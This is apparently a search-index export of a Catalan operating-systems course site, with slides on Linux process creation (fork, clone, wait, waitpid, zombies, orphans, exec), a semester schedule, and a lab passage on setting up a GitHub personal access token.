    "text": "fork() or clone()\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\nint\nmain() {\n    pid_t pid;\n    if ((pid = fork()) &lt; 0) {\n        exit(-1);\n    }\n    exit(0); \n}\n\ngcc ex7.c -o ex7\nstrace -c ./ex7\nstrace -e trace=process ./ex7\n\n\n\n\n\n\n\nExercicis\n\n\n\nInvestiga les simplificacions que fork() fa sobre clone().\nAdapta el codi per utilitzar clone() directament.\n\n\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nAbsència de fork() en strace:\n\nNo hi ha una invocació directa a la crida al sistema fork().\nEn canvi, es detecta una crida a clone(), que és la crida al sistema principal del nucli de Linux per crear tant processos com fils.\n\nRelació entre fork() i clone():\n\nLa funció fork(), definida a la biblioteca estàndard de C (glibc), actua com un embolcall que crida internament a clone() amb un conjunt de paràmetres predeterminats.\n\nclone() i els seus flags:\n\nSIGCHLD: Configura el mecanisme de notificació per al procés pare.\nCLONE_CHILD_SETTID: Estableix l’identificador de fil (TID) al procés fill.\nCLONE_CHILD_CLEARTID: Neteja automàticament aquest identificador en finalitzar.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#indeterminisme-fork",
    "href": "slides/03-create.html#indeterminisme-fork",
    "title": "Creació de Processos a Linux",
    "section": "Indeterminisme fork()",
    "text": "Indeterminisme fork()\n\n\nint main() {\n  pid_t pid;\n  if ((pid = fork()) &lt; 0) {\n    exit(-1);\n  } else if (pid == 0) {  \n    printf(\"My name is Rhaenyra\")\n  } else {\n    printf(\"My name is King Viserys\");\n  }\n  exit(0);\n}\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nLa execució del programa és no determinista.\nEl procés pare i el fill poden executar-se en qualsevol ordre.\nL’planificador del sistema operatiu decideix quin procés s’executa en un moment donat.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#wait",
    "href": "slides/03-create.html#wait",
    "title": "Creació de Processos a Linux",
    "section": "wait()",
    "text": "wait()\n\n\n\n\n\n\n\n\n\nwait()\n\n\nLa crida al sistema wait() permet que un procés pare bloquegi la seva execució fins que un dels seus processos fills canviï d’estat (normalment, quan finalitza). També recupera informació sobre el fill que ha canviat d’estat.\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\npid_t wait(int *_Nullable wstatus);\n\n\n\n\n\n\n\n\n\n\n\nPropietats\n\n\n\nRetorna el PID del procés fill que ha canviat d’estat, o -1 en cas d’error.\nSi wstatus no és NULL, l’estat de sortida del fill s’hi emmagatzema.\n\n\n\n\n\n\n\n\n\n\n\n\nSIGCHLD\n\n\nEl senyal SIGCHLD s’envia al procés pare quan un fill canvia d’estat.\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n    participant C as Fill\n    P-&gt;&gt;K: fork()\n    K--&gt;&gt;C: Crea Procés Fill\n    activate C\n    K--&gt;&gt;P: Retorna PID del Fill\n    C-&gt;&gt;C: Execució del Fill\n    P-&gt;&gt;K: wait()\n    K-&gt;&gt;K: Bloqueja pare fins que el fill canviï d'estat\n    C-&gt;&gt;K: exit(42)\n    deactivate C\n    K-&gt;&gt;K: PCB retingut \n    K--&gt;&gt;P: notificació SIGCHLD\n    P-&gt;&gt;K: Llegeix estat del Fill Reads\n    K-&gt;&gt;K: Allibera PCB fill\n    K--&gt;&gt;P: Retorna estat (42)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-wait",
    "href": "slides/03-create.html#example-wait",
    "title": "Creació de Processos a Linux",
    "section": "Example: wait()",
    "text": "Example: wait()\n\n\nint main() {\n    pid_t pid;\n    if ((pid = fork()) &lt; 0) {\n        exit(-1);\n    } else if (pid == 0) {  \n        printf(\"My name is Rhaenyra\")\n    } else {\n        wait(NULL);\n        printf(\"My name is King Viserys\");\n        }\n    exit(0);\n}\n\n\n\n\n\n\n\nObservacions\n\n\n\nEl procés pare utilitza wait() per esperar que el seu fill finalitzi abans de continuar. Això assegura que la sortida serà sempre My name is King Viserys després de My name is Rhaenyra.\nNo garanteix que el fill s’executi primer. Només assegura que el fill acabi abans que el pare reprengui la seva execució.\nwait() és per a un pare que espera un fill. Un fill no pot utilitzar-lo per esperar el seu pare.\nAltres mecanismes, com pause() i senyals, són necessaris per a diferents escenaris de sincronització.\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare (PID X)\n    participant K as Kernel\n    participant C as Fill (PID Y)\n    \n    P-&gt;&gt;K: fork()\n    K--&gt;&gt;C: Crea Procés\n    K--&gt;&gt;P: Retorna PID Y\n    K--&gt;&gt;C: Returns 0\n    \n    P-&gt;&gt;K: wait()\n    Note right of P: Estat: WAITING\n    K-&gt;&gt;K: Planificador: continua Fill\n    \n    activate C\n    C-&gt;&gt;C: printf(\"My name is Rhaenyra\")\n    C-&gt;&gt;K: exit(0)\n    deactivate C\n    \n    K--&gt;&gt;P: SIGCHLD + status (0)\n    Note right of P: Estat: RUNNING\n    P-&gt;&gt;P: printf(\"My name is King Viserys\")\n    P-&gt;&gt;K: exit(0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitpid",
    "href": "slides/03-create.html#waitpid",
    "title": "Creació de Processos a Linux",
    "section": "waitpid()",
    "text": "waitpid()\n\n\n\n\n\n\n\n\n\nwaitpid()\n\n\nPermet que un procés pare esperi de manera selectiva que un procés fill específic canviï d’estat. També proporciona més control sobre el comportament de l’espera mitjançant opcions addicionals.\npid_t waitpid(pid_t pid, int *_Nullable wstatus, int options);\n\n\n\n\n\n\n\n\n\n\n\nOptions\n\n\n\nWNOHANG: No bloquejar si cap procés fill ha canviat d’estat. Això significa que la crida retorna immediatament.\nWUNTRACED: També retorna per processos fills que han estat aturats (per exemple, per un senyal).\nWCONTINUED: També retorna per processos fills que han estat reprès després d’haver estat aturat (disponible des de Linux 2.6.10).\n\n\n\n\n\n\n\n\n\n\n\n\n\nValors de pid\n\n\n\n\\(\\lt -1\\): Espera qualsevol procés fill el PID del qual sigui igual al valor absolut de pid.\n\\(= -1\\): Espera qualsevol procés fill.\n\\(= 0\\): Espera qualsevol procés fill el PID del qual sigui igual al del procés que crida (el pare).\n\\(\\gt 0\\): Espera el procés fill específic identificat per aquest valor de pid.\n\n\n\n\n\n\n\n\n\n\n\n\nObservació\n\n\nwait(NULL) és equivalent a waitpid(-1, NULL, 0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-waitpid",
    "href": "slides/03-create.html#example-waitpid",
    "title": "Creació de Processos a Linux",
    "section": "Example: waitpid()",
    "text": "Example: waitpid()\n\n\n\nint main() {\n    printf(\"Dracarys!\\n\");\n    pid_t drogon = fork();\n    if (drogon == 0) { \n        sleep(1);  \n        printf(\"Fire and blood in KL!\\n\");\n        exit(0); \n    }\n    pid_t rhaegal = fork();\n    if (rhaegal == 0) {\n        sleep(3); \n        printf(\"Flying over Saltspear\\n\");\n        exit(0);\n    }\n    waitpid(rhaegal, NULL, 0);\n    printf(\"Rhaegal has returned\\n\");\n    waitpid(drogon, NULL, 0);\n    printf(\"Drogon has returned\\n\");\n    exit(0);\n}\n\n\n\n\n\n\nsequenceDiagram\n    participant D as Daenerys\n    participant K as Kernel\n    participant D1 as Drogon\n    participant D2 as Rhaegal\n  \n    Note over D: dracarys!\n    D-&gt;&gt;K: fork() (Drogon)\n    activate D1\n    D-&gt;&gt;K: fork() (Rhaegal)\n    activate D2\n\n    Note over D1: sleep(1)\n    D1-&gt;&gt;D1: printf(\"Fire and blood in KL!\")\n    D1-&gt;&gt;K: exit(0)\n    deactivate D1\n\n    Note over D2: sleep(3)\n    D2-&gt;&gt;D2: printf(\"Flying over Saltspear\")\n    D2-&gt;&gt;K: exit(0)\n    deactivate D2\n\n    D-&gt;&gt;K: waitpid(Rhaegal)\n    K--&gt;&gt;D: Returns Rhaegal's PID (Rhaegal finished)\n    D-&gt;&gt;D: printf(\"Rhaegal has returned\")\n    \n    D-&gt;&gt;K: waitpid(Drogon)\n    K--&gt;&gt;D: Returns Drogon's PID (Drogon finished)\n    D-&gt;&gt;D: printf(\"Drogon has returned\")\n\n    D-&gt;&gt;K: exit(0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-macros",
    "href": "slides/03-create.html#waitwaitpid-macros",
    "title": "Creació de Processos a Linux",
    "section": "wait()/waitpid(): Macros",
    "text": "wait()/waitpid(): Macros\nEl paràmetre status de wait() o waitpid() és un enter (int) que conté informació codificada sobre com ha finalitzat (o ha canviat d’estat) el procés fill.\n\n\n\n\n\n\n\nx86\n\n\n\n\n\n\n\n\n\n\nBits\nCamp\nDescripció\n\n\n\n\n0-6\nCodi de Senyal\nEl número del senyal que ha causat la terminació del fill, si n’hi ha. (WTERMSIG(status)).\n\n\n7\nIndicador de Core Dump\nIndicador si s’ha generat un core dump. (WCOREDUMP(status)).\n\n\n8-15\nExit\nEl valor de retorn de l’exit() del fill. (WEXITSTATUS(status))\n\n\n16-31\n-\nGeneralment no utilitzat o reservat.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nQuè passa amb exit(256)?\n\n\nEl número 256 es converteix en un codi de sortida de 0 perquè els codis de sortida solen estar limitats a 8 bits (0-255). Això es deu al fet que el sistema operatiu només utilitza els 8 bits menys significatius per al codi de sortida. Per tant, WEXITSTATUS(status) retornarà 0.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-status-macros-i",
    "href": "slides/03-create.html#waitwaitpid-status-macros-i",
    "title": "Creació de Processos a Linux",
    "section": "wait()/waitpid(): Status Macros (I)",
    "text": "wait()/waitpid(): Status Macros (I)\n\nWIFEXITED(status): Retorna cert (no zero) si el procés fill ha finalitzat normalment mitjançant exit().\nWEXITSTATUS(status): Retorna el codi de sortida del fill. Només vàlid si WIFEXITED(status) és cert.\nWIFSIGNALED(status): Retorna cert si el canvi d’estat del fill ha estat causat per un senyal.\nWTERMSIG(status): Retorna el número del senyal que ha causat la terminació del procés fill. Només vàlid si WIFSIGNALED(status) és cert.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-status-macros-ii",
    "href": "slides/03-create.html#waitwaitpid-status-macros-ii",
    "title": "Creació de Processos a Linux",
    "section": "wait()/waitpid(): Status Macros (II)",
    "text": "wait()/waitpid(): Status Macros (II)\n\nWCOREDUMP(status): Retorna cert si el fill ha terminat i ha generat un core dump. Només vàlid si WIFSIGNALED(status) és cert. (La disponibilitat pot variar).\nWIFSTOPPED(status): Retorna cert si el fill ha estat suspès (aturat) per un senyal. Per detectar això, waitpid() ha de ser cridat amb l’opció WUNTRACED.\nWSTOPSIG(status): Retorna el número del senyal que ha aturat el fill. Només vàlid si WIFSTOPPED(status) és cert.\nWIFCONTINUED(status): Retorna cert si un fill que havia estat aturat ha estat reactivat (amb SIGCONT). Requereix l’opció WCONTINUED en waitpid() (Linux kernel 2.6 i posteriors).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exemple-waitpid-macros",
    "href": "slides/03-create.html#exemple-waitpid-macros",
    "title": "Creació de Processos a Linux",
    "section": "Exemple: waitpid() & Macros",
    "text": "Exemple: waitpid() & Macros\n\n\nint main(int argc, char *argv[]){\npid_t pid, w; int status;\npid = fork();\nif (pid == 0) { \n  if (argc == 1) pause(); exit(atoi(argv[1]));\n} else {                    \n  do {\n    w = waitpid(pid, &status, WUNTRACED | WCONTINUED);\n    if (w == -1) {\n      perror(\"waitpid\"); exit(EXIT_FAILURE);\n    }\n    if (WIFEXITED(status)) {\n      printf(\"exited, [%d] status=%d\\n\", \n             pid, WEXITSTATUS(status));\n    } else if (WIFSIGNALED(status)) {\n      printf(\"killed by signal, \n        [%d] -&gt; %d\\n\", pid, WTERMSIG(status));\n    } else if (WIFSTOPPED(status)) {\n      printf(\"stopped by signal [%d] \n        -&gt; %d\\n\", pid, WSTOPSIG(status));\n    } else if (WIFCONTINUED(status)) { \n      printf(\"continued\\n\"); }\n  } while (!WIFEXITED(status) && !WIFSIGNALED(status));\n  exit(0);\n}\n\n\n\n\n\n\n\n\n\nPregunta?\n\n\nQuin serà el resultat després d’executar ./ex8 42?",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#estat-zombie",
    "href": "slides/03-create.html#estat-zombie",
    "title": "Creació de Processos a Linux",
    "section": "Estat Zombie",
    "text": "Estat Zombie\n\n\n\n\n\n\n\nTASK_ZOMBIE\n\n\nDesprés d’executar exit(), un procés no s’elimina immediatament. En lloc d’això, entra en l’estat zombie fins que el seu procés pare processa la notificació SIGCHLD o crida a wait() o waitpid(). Si el pare no ho fa, el fill roman en aquest estat indefinidament.\n\n\n\n\n\n\n// kernel/exit.c\nvoid do_exit(long code) {\n    struct task_struct *tsk = current;\n    tsk-&gt;exit_code = code;          \n    exit_files(tsk);               \n    exit_mm(tsk);                 \n    exit_notify(tsk, group_dead);   \n}\n\n// kernel/exit.c\nstatic void exit_notify(struct task_struct *tsk, \n    int group_dead) {\n    tsk-&gt;exit_state = EXIT_ZOMBIE;  \n    if (group_dead)\n        tsk-&gt;exit_state |= EXIT_DEAD;\n    tsk-&gt;exit_signal : SIGCHLD;\n    do_notify_parent(tsk, sig);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#orfes-i",
    "href": "slides/03-create.html#orfes-i",
    "title": "Creació de Processos a Linux",
    "section": "Orfes (I)",
    "text": "Orfes (I)\nUn procés fill esdevé un orfe si el seu pare mor abans que ell. En aquest cas, el nucli reassigna el fill al procés init (PID 1), que és responsable de netejar els processos orfes.\n\n\n\n\n\nsequenceDiagram\n    participant Pare\n    participant Kernel\n    participant Fill\n    participant Init\n    \n    Parent-&gt;&gt;Kernel: exit() // Mor el pare\n    Kernel-&gt;&gt;Kernel: find_zombie_children()\n    Note right of Child: Orfe, fill sense pare\n    Kernel-&gt;&gt;Child: reparent_to_init()\n    loop Cada 0.5s\n        Init-&gt;&gt;Kernel: wait()\n        Kernel-&gt;&gt;Init: Retorna estat\n        Kernel-&gt;&gt;Child: release_task()\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#orfes-i-zombies",
    "href": "slides/03-create.html#orfes-i-zombies",
    "title": "Creació de Processos a Linux",
    "section": "Orfes i Zombies",
    "text": "Orfes i Zombies\n\n\n\n\n\n\n\n\n\nEscenari\nMecanisme del Nucli\nTemps\nConsequències\n\n\n\n\nPare Actiu\nReté task_struct fins a wait()\nIndefinit\n- Consumeix entrada a la taula de processos- PID es manté ocupat\n\n\nPare Mort\nreparent_to_init() (PPID←1)\n\\(\\le 1\\) ms\n- Init neteja en segon pla (init periodicament crida wait()) - Alliberació asíncrona\n\n\nReinici del Sistema\nkill(pid, SIGKILL)\n0\n- Alliberació forçada (via do_exit() global) - Sense garantia d’estat\n\n\nPare ignora SIGCHLD\nZombie persistent\n\\(\\infty\\)\n- Requereix intervenció manual",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-factoria-de-zombies",
    "href": "slides/03-create.html#example-factoria-de-zombies",
    "title": "Creació de Processos a Linux",
    "section": "Example: Factoria de Zombies",
    "text": "Example: Factoria de Zombies\n\n\nzombie.c\nint main() {\npid_t pid; int i;\nfor (i = 0; ; i++) {\n    pid = fork();\n    if (pid &gt; 0) {\n        printf(\"Zombie #%d born:\\n\",i + 1); \n        sleep(1);\n    } else {\n        printf(\"*drool* Boooo! Arrgghh! *slobber*\\n\");\n        exit(0);\n    }\n}\nreturn 0;\n}\n\nTerminal 1\n$ gcc zombie.c -o zombie\n$ ./zombie\nZombie #1 born:\nZombie #2 born:\nZombie #3 born:\n...\n\nTerminal 2\n$ watch -n 1 \"ps u -C zombie\"\n\n\n\nInspired by https://www.refining-linux.org/archives/7-Dr.-Frankenlinux-or-how-to-create-zombie-processes.html",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#transformació-exec",
    "href": "slides/03-create.html#transformació-exec",
    "title": "Creació de Processos a Linux",
    "section": "Transformació: exec()",
    "text": "Transformació: exec()\n\n\n\n\n\n\n\n\n\nProcessos Independents?\n\n\nTots els processos (excepte PID 1) tenen un pare i es creen amb clone(). Però com poden bash i ls ser programes separats?\n\n\n\n\n\n\n\n\n\n\n\nSyscall exec()\n\n\nPermet transformar un procés fill en un nou programa. La família de funcions exec substitueix l’espai d’adreces del procés actual amb un nou programa carregat des d’un fitxer executable (normalment en format ELF).\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nComponent\nAbans de exec()\nDesprés de exec()\n\n\n\n\nEspai d’Adreces\nMapeig original\nNou mapeig ELF\n\n\nTaula de Fitxers\nHeretat\nHeretat (excepte FD_CLOEXEC)\n\n\nRegistres CPU\nContext original\nEIP=punt d’entrada, ESP=pila\n\n\nSenyals\nHandlers personalitzats\nTots restablerts a SIG_DFL\n\n\nMemòria Compartida\nMAP_SHARED preservada\nMAP_PRIVATE eliminada\n\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Original\n    participant K as Kernel\n    participant N as Nou\n\n    P-&gt;&gt;K: execve(\"/bin/ls\", [\"ls\",\"-l\"], envp)\n    activate K\n\n    K-&gt;&gt;K: Valida ELF (e_ident, permissions)\n    K-&gt;&gt;K: flush_old_exec()\n    K-&gt;&gt;K: free_pgtables()\n    K-&gt;&gt;K: load_elf_binary()\n\n    Note over P,N: El PID no canvia: és el mateix procés a nivell de nucli\n\n    Note over K,N: Crear Nou Context\n    K-&gt;&gt;N: Map .text (RX)\n    K-&gt;&gt;N: Map .data/.bss (RW)\n    K-&gt;&gt;N: setup_arg_pages(argv, envp) ⟶ stack\n    K-&gt;&gt;N: setup_brk() ⟶ heap\n    K-&gt;&gt;N: start_thread(entry_point) &lt;br&gt; PC/IP ← entry point of the ELF binary\n\n    deactivate K\n\n    Note over N: Nova execució de codi\n    N--&gt;&gt;K: Syscalls Futures\n    K--&gt;&gt;N: Returna\n\n    Note right of P: Els espai d'adreces original &lt;br&gt; s'ha destruït &lt;br&gt; `task_struct` és el mateix &lt;br&gt; però amb el nou codi carregat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#familia-exec",
    "href": "slides/03-create.html#familia-exec",
    "title": "Creació de Processos a Linux",
    "section": "Familia exec()",
    "text": "Familia exec()\n\n\n\n\n\n\n\n\n\n\nValors de retorn\n\n\n\nMai retorna en cas d’èxit (substitueix completament el procés).\nRetorna -1 només en cas d’error (s’estableix errno).\n\n\n\n\n\n\n#include &lt;unistd.h&gt;\n// Variants with argument list (variable arguments)\nint execl(const char *path, const char *arg0, ..., NULL);                \nint execlp(const char *file, const char *arg0, ..., NULL);                  \nint execle(const char *path, const char *arg0, ..., NULL, \n    char *const envp[]);\n\n#include &lt;unistd.h&gt;\n// Variants with argument vector (array)\nint execv(const char *path, char *const argv[]);                         \nint execvp(const char *file, char *const argv[]);                       \nint execve(const char *path, char *const argv[],\n    char *const envp[]);             \n\n\n\n\nexecve() és la crida al sistema bàsica (les altres són embolcalls de glibc).\nGestiona correctament SUID/SGID.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exemple-ls--la",
    "href": "slides/03-create.html#exemple-ls--la",
    "title": "Creació de Processos a Linux",
    "section": "Exemple: ls -la",
    "text": "Exemple: ls -la\n\n\nint main() {\n    pid_t pid = fork();\n    if (pid == -1) { \n        perror(\"fork\");\n        exit(-1);\n    }\n    if (pid == 0) { \n        char *args[] = {\"ls\", \"-la\", NULL};\n        execv(\"/bin/ls\", args);\n        perror(\"execv fallat\"); \n        exit(-1);\n    } \n    else { \n        int status;\n        pid_t w = waitpid(pid, \n            &status, WUNTRACED);\n    }\n    exit(0);\n}\n\ngcc ex7.c -o ex7\n./ex7\ntotal 24\ndrwxr-xr-x  2 user user 4096 Feb 20 10:00 .\ndrwxr-xr-x 10 user user 4096 Feb 20 09:58 .. \n-rwxr-xr-x 1 user user 70512 Feb 20 14:57 ex7\n-rw-r--r-- 1 user user   107 Feb 20 13:23 ex7.c\n\n\n\n\n\n\nsequenceDiagram\n    box rgb(240,240,240) Parent Process\n    participant P\n    end\n    \n    box rgb(240,240,240) Kernel\n    participant K\n    end\n    \n    box rgb(240,240,240) Child Process\n    participant F\n    end\n\n    P-&gt;&gt;K: Calls `fork()`\n    activate K\n    K--&gt;&gt;F: Crea una nova còpia del procés (Fill, PID Y)&lt;br&gt; amb memòria idèntica (CoW)\n    K--&gt;&gt;P: Retorna PID Y al Pare\n    deactivate K\n    \n    par Execució Concurrent\n        F-&gt;&gt;K: Crida `execv(\"/bin/ls\", [\"ls\",\"-la\"], NULL)`\n        \n        activate K\n        K-&gt;&gt;K: Valida `/bin/ls` (permissos, format)\n        K-&gt;&gt;K: Esborra tota la memòria del Fill (F)**\n        K-&gt;&gt;K: Carrega `ls` a la memòria del Fill**&lt;br&gt;  (codi, dades, nova pila)\n        K-&gt;&gt;K: Reconfigura els registres de la CPU i el PC/IP&lt;br&gt;  al punt d'entrada de `ls`\n        deactivate K\n\n        Note over K,F: Codi original Fill (PID Y) &lt;br&gt; ha estat reemplaçat per `/bin/ls`.\n\n        activate F\n        F-&gt;&gt;F: Executa el programa `/bin/ls -la`&lt;br&gt;Genera la llista a `stdout`.\n        F-&gt;&gt;K: `exit(0)` (Finalitza `/bin/ls`)\n        deactivate F\n        \n        activate P\n        P-&gt;&gt;K: `waitpid(PID Y, &status, WUNTRACED)`\n        deactivate P\n    end\n\n    K--&gt;&gt;P: Notifica al Pare que el fill (ara `ls`) ha acabat.\n    activate P\n    P-&gt;&gt;K: `exit(0)` (Finalitza el Pare)\n    deactivate P",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exercicis-proposats",
    "href": "slides/03-create.html#exercicis-proposats",
    "title": "Creació de Processos a Linux",
    "section": "Exercicis proposats",
    "text": "Exercicis proposats\n\nExercici de Creació de Processos",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#això-és-tot-per-avui",
    "href": "slides/03-create.html#això-és-tot-per-avui",
    "title": "Creació de Processos a Linux",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\nLa creació i gestió de processos és fonamental en els sistemes operatius. Hem explorat com fork() crea nous processos, com exec() permet la transformació de processos, i com wait() i waitpid() gestionen la sincronització entre pares i fills. A més, hem vist com es gestionen els processos zombies i orfes, i la importància de les macros per interpretar els estats dels processos fills.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Creació de processos"
    ]
  },
  {
    "objectID": "course-information/schedule.html",
    "href": "course-information/schedule.html",
    "title": "Sistemes Operatius",
    "section": "",
    "text": "A continuació es presenta un calendari complet dels temes, el contingut del curs i les tasques per al semestre. Tingueu en compte que aquest calendari és un document viu i es pot actualitzar. Tots els canvis es publicaran aquí per assegurar-vos que teniu la informació més actual.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSetmana\nTipus\nData\nTema\nDiapositives\nApunts\nLaboratori\nAltres\nTasques\nLliuraments\n\n\n\n\n1\nTeoria\n09/09/25\nUnitat 01: Introducció\n📖\n📚\n\n\n\n\n\n\n1\nLaboratori\n10/09/25\nUnitat 01: Virtualització i Control de Versions\n📖\n\n📄 📄 📄 📄 📄\n\n\n\n\n\n2\nTeoria\n16/09/25\nUnitat 01: Introducció a la programació de Sistema (I) (C)\n📖\n📚\n\n\n👩🏻‍💻\n\n\n\n3\nTeoria/Laboratori\n22/09/25\nUnitat 02: Kernel de Linux\n📖\n\n📄\n\n\n\n\n\n3\nLaboratori\n24/09/25\nUnitat 02: Crides a sistema\n📖\n\n📄 📄👩🏻‍💻\n\n👩🏻‍💻\n\n\n\n4\nLaboratori\n29/09/25\nUnitat 02: Kernel de Linux\n\n\n📄 📄\n\n\n\n\n\n4\nTeoria/Laboratori\n01/10/25\nUnitat 03: Processos\n📖\n\n\n\n🔨\n\n\n\n5\nTeoria\n06/10/25\nUnitat 03: Creació de Processos\n📖\n\n\n\n👩🏻‍💻\n\n\n\n5\nTeoria/Laboratori\n08/10/25\nUnitat 03: Senyals\n📖\n👩🏻‍💻\n\n\n\n\n\n\n6\nTeoria/Laboratori\n13/10/25\nUnitat 03: Comunicació entre processos\n📖\n\n📄\n\n\n\n\n\n6\nLaboratori\n15/10/25\nVaga general\n\n\n\n\n\n\n\n\n7\nTeoria/Laboratori\n20/10/25\nUnitat 03: Pipes\n📖\n\n\n\n👩🏻‍💻\n\n\n\n7\nLaboratori\n20/10/25\nUnitat 03\n\n\n📄\n\n\n\n\n\n8\nTeoria\n27/10/25\nRepàs"
  },
  {
    "objectID": "course-information/schedule.html#planificació",
    "href": "course-information/schedule.html#planificació",
    "title": "Sistemes Operatius",
    "section": "",
    "text": "A continuació es presenta un calendari complet dels temes, el contingut del curs i les tasques per al semestre. Tingueu en compte que aquest calendari és un document viu i es pot actualitzar. Tots els canvis es publicaran aquí per assegurar-vos que teniu la informació més actual.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSetmana\nTipus\nData\nTema\nDiapositives\nApunts\nLaboratori\nAltres\nTasques\nLliuraments\n\n\n\n\n1\nTeoria\n09/09/25\nUnitat 01: Introducció\n📖\n📚\n\n\n\n\n\n\n1\nLaboratori\n10/09/25\nUnitat 01: Virtualització i Control de Versions\n📖\n\n📄 📄 📄 📄 📄\n\n\n\n\n\n2\nTeoria\n16/09/25\nUnitat 01: Introducció a la programació de Sistema (I) (C)\n📖\n📚\n\n\n👩🏻‍💻\n\n\n\n3\nTeoria/Laboratori\n22/09/25\nUnitat 02: Kernel de Linux\n📖\n\n📄\n\n\n\n\n\n3\nLaboratori\n24/09/25\nUnitat 02: Crides a sistema\n📖\n\n📄 📄👩🏻‍💻\n\n👩🏻‍💻\n\n\n\n4\nLaboratori\n29/09/25\nUnitat 02: Kernel de Linux\n\n\n📄 📄\n\n\n\n\n\n4\nTeoria/Laboratori\n01/10/25\nUnitat 03: Processos\n📖\n\n\n\n🔨\n\n\n\n5\nTeoria\n06/10/25\nUnitat 03: Creació de Processos\n📖\n\n\n\n👩🏻‍💻\n\n\n\n5\nTeoria/Laboratori\n08/10/25\nUnitat 03: Senyals\n📖\n👩🏻‍💻\n\n\n\n\n\n\n6\nTeoria/Laboratori\n13/10/25\nUnitat 03: Comunicació entre processos\n📖\n\n📄\n\n\n\n\n\n6\nLaboratori\n15/10/25\nVaga general\n\n\n\n\n\n\n\n\n7\nTeoria/Laboratori\n20/10/25\nUnitat 03: Pipes\n📖\n\n\n\n👩🏻‍💻\n\n\n\n7\nLaboratori\n20/10/25\nUnitat 03\n\n\n📄\n\n\n\n\n\n8\nTeoria\n27/10/25\nRepàs"
  },
  {
    "objectID": "labs/01-introduction/lab05.html",
    "href": "labs/01-introduction/lab05.html",
    "title": "Laboratori 5: Calculadora col·laborativa",
    "section": "",
    "text": "Crea un compte a GitHub: Si no tens un compte a GitHub, visita https://github.com/ i crea un compte gratuït.\n\n\n\nInicia la sessió al teu compte de GitHub en el navegador web.\nFes clic a la teva foto de perfil a la cantonada superior dreta i selecciona Configuració al menú desplegable.\nA la pàgina de configuració de GitHub, selecciona Configuració de desenvolupador al menú lateral esquerre.\nA la secció Tokens personals, fes clic a Genera un token personal i selecciona un Token (clássic) per a l’ús amb la línia de comandes.\n\n\n\n\nGenerar token\n\n\nEn aquest punt completa la informació requerida i fes clic a Generar token:\n\nIntrodueix un nom per al teu token.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nToken per a la màquina virtual del curs 2526 de Sistemes Operatius\n\n\n\nSelecciona els permisos que necessites per al teu token. Per a la majoria de les operacions bàsiques, com ara clonar repositoris i fer push, necessitaràs almenys els permisos següents:\n\nrepo (per accedir als repositoris privats i públics)\nworkflow (per executar workflows de GitHub Actions)\nwrite:packages (per pujar paquets a GitHub Packages)\n\nSelecciona una data de caducitat per al teu token. És recomanable establir una data de caducitat per motius de seguretat.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nPots seleccionar Custom i posar fins al 01/02/2026 on ja haurà acabat el curs.\n\n\n\n\n\n\nInicia una sessió a la terminal de la màquina virtual com a usuari normal.\nConfigura Git per utilitzar el token de GitHub executant la següent comanda:\ngit config --global github.token TOKEN\n\n\n\n\n\n\nConsellImportant:\n\n\n\nAssegura’t de substituir TOKEN pel token d’accés personal que has generat a GitHub. Això emmagatzemarà el token de GitHub en la configuració global de Git al teu sistema Debian.\n\n\nVerifica que el token s’hagi configurat correctament executant:\ngit config --global --get github.token\n\nSi tot ha anat bé, veuràs el token que has configurat a la sortida d’aquesta 